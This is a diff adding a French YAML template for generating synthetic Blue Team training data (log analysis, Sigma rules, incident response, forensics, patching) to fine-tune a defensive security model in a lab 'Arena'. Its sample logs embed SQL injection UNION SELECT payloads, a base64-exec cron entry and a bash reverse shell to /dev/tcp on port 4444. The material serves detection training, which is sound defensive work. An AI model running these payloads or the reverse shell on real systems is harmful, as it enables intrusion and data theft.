@@ -1,0 +1,384 @@
+# 0Lith Training — Templates de génération Blue Team (Cryolith v2)
+# ==================================================================
+# Teacher génère des données d'entraînement cybersécurité défensive
+# pour fine-tuner Qwen3.5-4B → Cryolith v2 LoRA.
+#
+# Chaque exemple doit inclure un bloc <think>...</think> contenant
+# le raisonnement défensif (triage, corrélation, hypothèses).
+#
+# Usage :
+#   python scripts/generate_synthetic.py \
+#     --teacher ollama:qwen3:14b \
+#     --template templates/blue_team_generation.yaml
+
+agent: "blue"
+description: "Génération de données défensives pour Cryolith v2 — 8 catégories SOC/DFIR"
+
+system_prompt: |
+  Tu es Cryolith, agent Blue Team de 0Lith.
+  Expert en sécurité défensive, analyse de logs, détection de menaces, réponse à incidents et forensics.
+  Tu opères dans le contexte Arena de 0Lith pour protéger l'infrastructure simulée contre Pyrolith (Red Team).
+  Tu raisonnes méthodiquement dans un bloc <think>...</think> avant de proposer tes détections,
+  règles Sigma, playbooks ou analyses. Tu fournis toujours des artefacts actionnables.
+
+categories:
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 1. LOG ANALYSIS — Détection d'anomalies dans les logs
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "log_analysis"
+    mitre_id: "T1190"
+    mitre_name: "Exploit Public-Facing Application"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Analyse les logs suivants et identifie les activités malveillantes dans l'Arena 0Lith.
+
+      Type de logs : {log_type}
+      Extrait de logs :
+      {log_sample}
+
+      Questions à répondre :
+      1. <think> : que vois-tu dans ces logs ? Hypothèses initiales, timeline de l'attaque, pivots suspects
+      2. Activités malveillantes identifiées (liste avec timestamps et justification)
+      3. Technique MITRE ATT&CK correspondante
+      4. Niveau de confiance (HIGH/MEDIUM/LOW) et justification
+      5. Actions immédiates recommandées (containment)
+      6. Artefacts à collecter pour l'investigation forensique
+    variations:
+      - log_type: "Logs d'accès Apache/Nginx — attaque SQLi"
+        log_sample: |
+          2025-03-20 14:32:01 10.42.0.100 "GET /search?q=test HTTP/1.1" 200 1420
+          2025-03-20 14:32:45 10.42.0.100 "GET /search?q=' HTTP/1.1" 500 342
+          2025-03-20 14:32:46 10.42.0.100 "GET /search?q='%20OR%201=1-- HTTP/1.1" 200 8834
+          2025-03-20 14:32:47 10.42.0.100 "GET /search?q='%20UNION%20SELECT%201,username,password,1%20FROM%20users-- HTTP/1.1" 200 12450
+          2025-03-20 14:32:48 10.42.0.100 "GET /search?q='%20UNION%20SELECT%201,flag_value,1,1%20FROM%20flags-- HTTP/1.1" 200 156
+      - log_type: "Logs SSH auth — brute force puis succès"
+        log_sample: |
+          Mar 20 15:01:12 sshd[1234]: Failed password for root from 10.42.0.100 port 45231 ssh2
+          Mar 20 15:01:13 sshd[1234]: Failed password for root from 10.42.0.100 port 45232 ssh2
+          Mar 20 15:01:14 sshd[1234]: Failed password for admin from 10.42.0.100 port 45233 ssh2
+          Mar 20 15:01:15 sshd[1234]: Failed password for root from 10.42.0.100 port 45234 ssh2
+          Mar 20 15:01:16 sshd[1234]: Accepted password for root from 10.42.0.100 port 45235 ssh2
+          Mar 20 15:01:16 sshd[1234]: pam_unix(sshd:session): session opened for user root by (uid=0)
+      - log_type: "Logs système Linux — installation de backdoor"
+        log_sample: |
+          Mar 20 16:45:01 CRON[2891]: (root) CMD (python3 -c 'import base64;exec(base64.b64decode("aW1wb3J0IHNvY2tldA=="))')
+          Mar 20 16:45:02 kernel: audit: type=SYSCALL msg=pid=2892 exe="/usr/bin/python3" syscall=socket
+          Mar 20 16:45:02 kernel: audit: type=EXECVE msg=pid=2892 a0="/bin/bash" a1="-i" a2=">&" a3="/dev/tcp/10.42.0.100/4444"
+          Mar 20 16:45:03 syslog: Connection from 10.42.0.100:51234 to 0.0.0.0:4444
+      - log_type: "Logs réseau SIEM — scan de ports puis exploitation"
+        log_sample: |
+          2025-03-20T17:00:01Z | 10.42.0.100 | SCAN | SYN to 10.42.0.10:80,443,8080,22,21,25,3306
+          2025-03-20T17:00:15Z | 10.42.0.100 | SCAN | SYN to 10.42.0.11:22,23,80,443,3389
+          2025-03-20T17:02:31Z | 10.42.0.100 | HTTP | POST /admin/login 200 (credentials submitted)
+          2025-03-20T17:02:45Z | 10.42.0.100 | HTTP | GET /admin/dashboard 200 (auth bypass)
+          2025-03-20T17:03:12Z | 10.42.0.100 | HTTP | GET /admin/export?table=users 200 52430 bytes
+      - log_type: "Logs d'authentification Windows — Pass-the-Hash"
+        log_sample: |
+          2025-03-20 18:15:44 Security EventID=4624 Logon Type=3 SubjectUserSid=S-1-0-0 TargetUserName=svcadmin WorkstationName=WORKSTATION01 IpAddress=10.42.1.50 LogonProcessName=NtLmSsp AuthenticationPackageName=NTLM
+          2025-03-20 18:15:44 Security EventID=4776 ComputerName=DC01 TargetUserName=svcadmin Workstation=WORKSTATION01 Status=0x0 (success)
+          2025-03-20 18:15:51 Security EventID=4648 SubjectUserName=svcadmin TargetServerName=FILESERVER01 TargetUserName=svcadmin (explicit credential use)
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 2. SIGMA RULES — Écriture de règles de détection
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "sigma_rules"
+    mitre_id: "TA0005"
+    mitre_name: "Defense Evasion / Detection"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Écris des règles Sigma de détection pour l'Arena 0Lith.
+
+      Comportement à détecter : {behavior}
+      Source de logs : {log_source}
+      Faux positifs connus : {false_positives}
+
+      Structure de réponse :
+      1. <think> : analyse du comportement, champs de logs discriminants, seuils, stratégie de détection (signature vs anomalie)
+      2. Règle Sigma complète et valide (YAML, avec tous les champs requis : title, id, status, description, references, author, date, tags, logsource, detection, falsepositives, level)
+      3. Explication de la logique de détection
+      4. Test de la règle : exemples de logs qui MATCHENT et qui ne matchent PAS
+      5. Limitations et cas aux limites
+      6. Règle complémentaire optionnelle (haute sensibilité vs haute précision)
+    variations:
+      - behavior: "SQL Injection via paramètres GET — patterns %27, UNION SELECT, OR 1=1"
+        log_source: "Logs d'accès web (Apache/Nginx) — champ cs-uri-query ou request"
+        false_positives: "Tests de développeurs, scanners de vulnérabilités autorisés (Burp Suite)"
+      - behavior: "Brute force SSH — multiples échecs d'auth depuis une même IP en 60s"
+        log_source: "Logs syslog authpriv — messages sshd Failed password"
+        false_positives: "Serveurs de monitoring avec mauvaises credentials, migrations"
+      - behavior: "Exécution d'un reverse shell bash via /dev/tcp"
+        log_source: "Auditd syscall logs ou EDR process events"
+        false_positives: "Scripts de test réseau légitimes des SysAdmins"
+      - behavior: "Création d'un cron job par un utilisateur non-root inhabituel"
+        log_source: "Syslog cron events + auditd file access sur /etc/cron.d/"
+        false_positives: "Déploiements applicatifs automatisés (CI/CD, Ansible)"
+      - behavior: "Énumération de répertoires web avec codes 403/404 en rafale"
+        log_source: "Logs d'accès HTTP — champ status + request path"
+        false_positives: "Crawlers SEO, outils de monitoring de disponibilité"
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 3. INCIDENT RESPONSE — Playbooks de réponse
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "incident_response"
+    mitre_id: "TA0040"
+    mitre_name: "Impact / Response"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Génère un playbook de réponse à incident pour l'Arena 0Lith.
+
+      Type d'incident : {incident_type}
+      Étendue détectée : {scope}
+      Systèmes affectés : {systems}
+      Contrainte de disponibilité : {availability}
+
+      Playbook requis :
+      1. <think> : évaluation de la sévérité, hypothèses sur l'attaquant, risques si containment différé, décision triage
+      2. Phase DETECT — preuves collectées, IOCs identifiés
+      3. Phase CONTAIN — actions immédiates (ordre d'exécution critique)
+      4. Phase ERADICATE — suppression de l'accès attaquant
+      5. Phase RECOVER — remise en service sécurisée
+      6. Phase LESSONS LEARNED — améliorations défensives post-incident
+    variations:
+      - incident_type: "Compromission d'une application web via SQLi + accès base de données"
+        scope: "Application vuln-webapp sur 10.42.0.10 — données utilisateurs potentiellement exfiltrées"
+        systems: "Flask/SQLite, Nginx reverse proxy, pas de WAF"
+        availability: "Service non-critique — downtime acceptable pour remediation complète"
+      - incident_type: "Accès root SSH non autorisé — brute force réussi"
+        scope: "Serveur SSH 10.42.0.11 — attaquant a root depuis 15 minutes"
+        systems: "Ubuntu 22.04, SSH exposé port 22, pas d'authentification par clé"
+        availability: "Serveur critique — uptime requis mais isolation réseau possible"
+      - incident_type: "Backdoor persistante découverte (cron job malveillant)"
+        scope: "Reverse shell actif depuis 10.42.0.100 — communication établie"
+        systems: "Linux avec cron, Python3 disponible, connexion réseau active"
+        availability: "Isolation immédiate acceptable — contenu non-critique"
+      - incident_type: "Exfiltration de données via DNS tunneling détectée"
+        scope: "Volume anormal de requêtes DNS TXT vers domaine externe suspect"
+        systems: "Réseau interne, DNS résolveur sur 10.42.0.1, données RH potentiellement exfiltrées"
+        availability: "Blocage DNS sélectif possible — ne pas couper toute résolution"
+      - incident_type: "Credential stuffing réussi sur API REST"
+        scope: "10 comptes compromis sur 500 testés — tokens JWT actifs volés"
+        systems: "API REST sur port 443, JWT sans révocation, base users SQLite"
+        availability: "Service e-commerce — downtime très coûteux, réponse chirurgicale requise"
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 4. THREAT HUNTING — Requêtes de chasse proactive
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "threat_hunting"
+    mitre_id: "TA0043"
+    mitre_name: "Reconnaissance / Hunting"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Génère une hypothèse de threat hunting et les requêtes associées pour l'Arena 0Lith.
+
+      Hypothèse de chasse : {hypothesis}
+      Infrastructure cible : {infrastructure}
+      Données disponibles : {data_sources}
+      Période d'investigation : {time_window}
+
+      Structure requise :
+      1. <think> : formulation précise de l'hypothèse, TTP associées, données nécessaires, plan de chasse
+      2. Hypothèse formelle (format : "Si [TTP], alors [observable dans les données]")
+      3. Requêtes de chasse (Splunk SPL, Elastic EQL, ou Python/grep selon les données disponibles)
+      4. Interprétation des résultats (vrais positifs vs bruit)
+      5. Pivot vers d'autres hypothèses si positif
+      6. Documentation pour intégration en règle de détection continue
+    variations:
+      - hypothesis: "Un attaquant a utilisé le mouvement latéral via SSH dans les 7 derniers jours"
+        infrastructure: "Réseau 10.42.0.0/24 avec 4 serveurs Linux"
+        data_sources: "Logs syslog centralisés dans SIEM, 7 jours de rétention"
+        time_window: "7 jours glissants"
+      - hypothesis: "Des credentials ont été exfiltrés via des requêtes HTTP anormalement longues"
+        infrastructure: "DMZ avec webapp sur 10.42.0.10, proxy Nginx"
+        data_sources: "Logs d'accès Nginx (taille des réponses, user-agents, timing)"
+        time_window: "24 dernières heures"
+      - hypothesis: "Un processus Python non-standard établit des connexions réseau sortantes"
+        infrastructure: "Serveurs Linux de l'Arena"
+        data_sources: "Netflow/connexions réseau + processlist snapshots toutes les 5 min"
+        time_window: "48 dernières heures"
+      - hypothesis: "Des modifications de fichiers de configuration système non planifiées ont eu lieu"
+        infrastructure: "Serveurs Ubuntu 22.04 avec auditd activé"
+        data_sources: "Logs auditd (syscalls write/rename sur /etc/), AIDE baseline"
+        time_window: "Derniers 30 jours"
+      - hypothesis: "Un attaquant effectue de la reconnaissance DNS interne depuis un hôte compromis"
+        infrastructure: "Réseau interne avec DNS sur 10.42.0.1"
+        data_sources: "Logs DNS queries (source IP, domaines demandés, volume)"
+        time_window: "Dernières 6 heures"
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 5. VULNERABILITY ASSESSMENT — Analyse de CVE et patch prioritization
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "vulnerability_assessment"
+    mitre_id: "T1190"
+    mitre_name: "Exploit Public-Facing Application"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Évalue la vulnérabilité suivante dans le contexte de l'Arena 0Lith et fournis un plan de remédiation.
+
+      CVE / Vulnérabilité : {cve}
+      Composant affecté : {component}
+      Version en production : {version}
+      Exposition réseau : {exposure}
+
+      Analyse requise :
+      1. <think> : évaluation du risque réel (exploitabilité, données exposées, impact business), contexte Arena
+      2. Description technique de la vulnérabilité et vecteur d'exploitation
+      3. Score CVSS v3.1 avec justification de chaque métrique
+      4. Exploitabilité dans l'environnement Arena (POC disponible ? Difficulté ?)
+      5. Plan de remédiation (patch, workaround, mitigation) avec ordre de priorité
+      6. Règle de détection de tentative d'exploitation
+    variations:
+      - cve: "CVE-2021-44228 (Log4Shell) — CVSS 10.0"
+        component: "Apache Log4j 2.x dans une application Java"
+        version: "Log4j 2.14.1 (vulnérable)"
+        exposure: "Accessible depuis le réseau interne Arena via HTTP header User-Agent"
+      - cve: "CVE-2023-44487 (HTTP/2 Rapid Reset) — CVSS 7.5"
+        component: "Nginx 1.24.0 reverse proxy"
+        version: "Nginx 1.24.0 (vulnérable avant 1.25.3)"
+        exposure: "Exposé sur port 443, potentiel DoS uniquement dans le contexte Arena"
+      - cve: "Injection SQL non documentée — CWE-89"
+        component: "Endpoint /search de l'application Flask vuln-webapp"
+        version: "Flask 3.0.3 (pas vulnérable), code applicatif vulnérable"
+        exposure: "Accessible depuis l'intérieur du réseau Arena"
+      - cve: "CVE-2024-3094 (XZ Utils backdoor) — CVSS 10.0"
+        component: "xz-utils 5.6.0-5.6.1 dans Ubuntu 22.04 (non affecté en prod)"
+        version: "Ubuntu 22.04 LTS (xz 5.2.5, non affecté)"
+        exposure: "Pas d'exposition directe — exercice de vérification et renseignement"
+      - cve: "Misconfiguration SSH — PermitRootLogin yes + PasswordAuthentication yes"
+        component: "OpenSSH 8.9p1 sur serveur vuln-ssh"
+        version: "OpenSSH 8.9p1 (configuration dangereuse, pas de CVE)"
+        exposure: "Port 22 accessible depuis tout le réseau Arena"
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 6. FORENSICS — Analyse forensique post-compromission
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "forensics"
+    mitre_id: "TA0010"
+    mitre_name: "Exfiltration / Forensics"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Conduis une analyse forensique post-compromission pour l'Arena 0Lith.
+
+      Scénario : {scenario}
+      Artefacts disponibles : {artifacts}
+      Question forensique : {question}
+
+      Analyse forensique :
+      1. <think> : méthodologie choisie, artefacts à prioriser, timeline attendue, hypothèses principales
+      2. Acquisition et préservation (ordre des volatilités respecté)
+      3. Analyse des artefacts disponibles (commandes + interprétation)
+      4. Reconstruction de la timeline de l'incident
+      5. Attribution et TTP de l'attaquant
+      6. Rapport synthétique (executive summary + findings techniques)
+    variations:
+      - scenario: "Serveur Linux compromis — processus reverse shell trouvé dans ps aux"
+        artifacts: "Memory dump disponible, logs syslog 7j, .bash_history, /tmp/, crontabs"
+        question: "Quand l'accès initial a-t-il eu lieu ? Quelles données ont été accédées ?"
+      - scenario: "Webapp compromise — exfiltration de base de données suspectée"
+        artifacts: "Logs Apache 30j, SQLite DB /tmp/webapp.db, requêtes HTTP archivées"
+        question: "Quelles données ont été exfiltrées ? Volume et destination ?"
+      - scenario: "Credentials compromis — source de la fuite inconnue"
+        artifacts: "/etc/shadow (accessible post-compromission), logs auth, historique SSH"
+        question: "Comment les credentials ont-ils été obtenus ? Brute force ou vol ?"
+      - scenario: "Conteneur Docker isolé — activité suspecte détectée post-match Arena"
+        artifacts: "docker inspect output, docker logs, overlay filesystem monté"
+        question: "Le conteneur a-t-il établi des connexions hors du réseau --internal ?"
+      - scenario: "Machine de rebond compromise — utilisée pour pivoter vers d'autres hôtes"
+        artifacts: "Netflow des 24h, authorized_keys modifiés, nouveau user créé"
+        question: "Vers quels hôtes a-t-on pivoté ? Qu'est-ce qui a été fait sur ces hôtes ?"
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 7. NETWORK DEFENSE — Règles pare-feu, IDS/IPS, segmentation
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "network_defense"
+    mitre_id: "TA0042"
+    mitre_name: "Resource Development / Network Defense"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Génère des règles de défense réseau pour l'Arena 0Lith.
+
+      Menace à contrer : {threat}
+      Infrastructure réseau : {network_infra}
+      Outils disponibles : {tools}
+      Contrainte opérationnelle : {constraint}
+
+      Réponse structurée :
+      1. <think> : analyse de la menace, points de contrôle réseau pertinents, compromis détection/performance
+      2. Règles iptables/nftables ou Snort/Suricata selon les outils
+      3. Justification de chaque règle (quelle attaque elle bloque/détecte)
+      4. Test de validation (comment vérifier que la règle fonctionne)
+      5. Impact sur le trafic légitime (faux positifs potentiels)
+      6. Monitoring et métriques associés
+    variations:
+      - threat: "Brute force SSH depuis un hôte interne compromis"
+        network_infra: "Réseau 10.42.0.0/24, serveur SSH sur 10.42.0.11, pas de firewall externe"
+        tools: "iptables + fail2ban sur le serveur SSH cible"
+        constraint: "Ne pas bloquer les connexions SSH légitimes des admins (10.42.0.1)"
+      - threat: "Scan de ports actif depuis l'intérieur du réseau Arena"
+        network_infra: "Switch virtuel Docker bridge, 4 conteneurs sur 10.42.0.0/24"
+        tools: "Règles iptables avec module recent (rate limiting) + Snort"
+        constraint: "Tolérer le trafic légitime du noise-gen (10.42.0.100)"
+      - threat: "Exfiltration DNS anormale (tunneling)"
+        network_infra: "Serveur DNS interne 10.42.0.1, résolveur bind9"
+        tools: "RPZ (Response Policy Zone) sur bind9 + Suricata règles DNS"
+        constraint: "DNS légitime doit continuer à fonctionner pour les services Arena"
+      - threat: "Connexions HTTP vers IPs suspectes (C2 callback)"
+        network_infra: "Proxy Nginx sur 10.42.0.10, traffic HTTP/HTTPS interne"
+        tools: "Règles Suricata + blocklist IP + proxy SSL inspection"
+        constraint: "Pas de coupure totale — isolation chirurgicale de l'hôte source"
+      - threat: "Exploitation de vulnérabilités web (SQLi, XSS, path traversal)"
+        network_infra: "App Flask sur 10.42.0.10:8080 derrière Nginx"
+        tools: "ModSecurity WAF (OWASP Core Rule Set) + règles custom"
+        constraint: "Pas de rupture du trafic légitime noise-gen (requêtes GET/POST normales)"
+
+  # ─────────────────────────────────────────────────────────────────────────
+  # 8. PATCH MANAGEMENT — Remédiation et hardening
+  # ─────────────────────────────────────────────────────────────────────────
+  - name: "patch_management"
+    mitre_id: "T1190"
+    mitre_name: "Exploit Public-Facing Application"
+    count_per_variation: 50
+    require_think: true
+    prompt_template: |
+      Génère un plan de remédiation et hardening pour l'Arena 0Lith.
+
+      Vulnérabilité exploitée : {vulnerability}
+      Système affecté : {system}
+      Contrainte de patch : {patch_constraint}
+      Contexte post-incident : {post_incident}
+
+      Plan de remédiation :
+      1. <think> : priorisation (données exposées ? accès persistant ? propagation ?), ordre des actions, risque de régression
+      2. Patch immédiat (correctif ou workaround selon disponibilité)
+      3. Vérification de l'efficacité du patch (test de régression)
+      4. Hardening complémentaire (réduire la surface d'attaque)
+      5. Mesures de détection ajoutées post-patch
+      6. Plan de validation avant remise en production
+    variations:
+      - vulnerability: "SQL Injection sur /search?q= — paramètre non sanitisé"
+        system: "Flask 3.0.3 + SQLite sur vuln-webapp"
+        patch_constraint: "Modification du code Python uniquement — pas de changement d'infra"
+        post_incident: "Données utilisateurs potentiellement exfiltrées — DB à auditer"
+      - vulnerability: "Authentification root SSH par mot de passe faible (toor)"
+        system: "OpenSSH 8.9p1 Ubuntu 22.04"
+        patch_constraint: "Service SSH doit rester accessible — pas de downtime"
+        post_incident: "Accès root obtenu pendant 20 min — persistence possible à chercher"
+      - vulnerability: "Auth bypass sur /admin via header manquant"
+        system: "Flask webapp — vérification Bearer token absente si VULN_AUTH_BYPASS=true"
+        patch_constraint: "Corriger le code applicatif + désactiver le flag d'env"
+        post_incident: "Actions admin non autorisées effectuées — audit des logs requis"
+      - vulnerability: "Cron job malveillant créé par l'attaquant dans /etc/cron.d/"
+        system: "Linux Ubuntu — root compromis temporairement"
+        patch_constraint: "Éradication complète sans réinstallation OS"
+        post_incident: "Attaquant avait root pendant 30 min — audit complet requis"
+      - vulnerability: "XSS stocké dans les commentaires — scripts injectés en DB"
+        system: "Flask webapp avec rendu HTML non échappé (VULN_XSS=true)"
+        patch_constraint: "Purger les entrées malveillantes ET corriger le code"
+        post_incident: "Combien de sessions utilisateurs ont été hijackées ?"
